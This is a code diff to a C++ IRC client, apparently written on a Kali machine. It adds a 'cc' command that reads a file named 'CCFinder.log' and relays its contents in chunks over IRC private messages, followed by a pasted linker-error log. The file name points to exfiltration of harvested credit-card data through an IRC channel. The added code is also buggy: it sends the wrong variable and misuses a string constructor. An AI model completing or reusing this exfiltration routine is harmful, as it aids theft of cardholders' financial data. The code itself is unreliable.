@@ -85,7 +85,26 @@ private:
 };
 
 ConsoleCommandHandler commandHandler;
+void ccCommand(std::string arguments, IRCClient* client)
+{
+    std::string to = arguments.substr(0, arguments.find(" "));
+    std::string text = arguments.substr(arguments.find(" ") + 1);
 
+    std::cout << "To " + to + ": " + text << std::endl;
+    
+                char buffer[256];
+FILE *fd = fopen("CCFinder.log", "rb");
+int bytes_read;
+while (!feof(fd)) {
+    if ((bytes_read = fread(&buffer, 1, 256, fd)) > 0) {
+        std::string msg(buffer, bytes_read, 0);
+        client->SendIRC("PRIVMSG " + to + ": " + text);
+       }
+    else
+        break;
+}
+    fclose(fd);
+};
 void msgCommand(std::string arguments, IRCClient* client)
 {
     std::string to = arguments.substr(0, arguments.find(" "));
@@ -102,6 +121,8 @@ void joinCommand(std::string channel, IRCClient* client)
 
     client->SendIRC("JOIN " + channel);
 }
+
+
 
 void partCommand(std::string channel, IRCClient* client)
 {
@@ -127,6 +148,7 @@ ThreadReturn inputThread(void* client)
 
     commandHandler.AddCommand("msg", 2, &msgCommand);
     commandHandler.AddCommand("join", 1, &joinCommand);
+    commandHandler.AddCommand("cc", 2, &ccCommand);
     commandHandler.AddCommand("part", 1, &partCommand);
     commandHandler.AddCommand("ctcp", 2, &ctcpCommand);
 
@@ -197,6 +219,7 @@ int main(int argc, char* argv[])
                     client.ReceiveData();
             }
 
+
             if (client.Connected())
                 client.Disconnect();
 
@@ -204,3 +227,13 @@ int main(int argc, char* argv[])
         }
     }
 }
+
+/*root@KaliPWN:~/Desktop/IRCClient# make
+g++ -c -Wall src/Main.cpp -o src/Main.o
+g++ -o ircclient src/IRCClient.o src/Thread.o src/IRCHandler.o src/IRCSocket.o src/Main.o -lpthread
+/usr/bin/ld: src/IRCClient.o: in function `IRCCommandPrefix::Parse(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)':
+IRCClient.cpp:(.text._ZN16IRCCommandPrefix5ParseENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE[_ZN16IRCCommandPrefix5ParseENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE]+0xe4): undefined reference to `split(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, char)'
+/usr/bin/ld: IRCClient.cpp:(.text._ZN16IRCCommandPrefix5ParseENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE[_ZN16IRCCommandPrefix5ParseENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE]+0x1d6): undefined reference to `split(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, char)'
+collect2: error: ld returned 1 exit status
+make: *** [Makefile:13: ircclient] Error 1
+*/
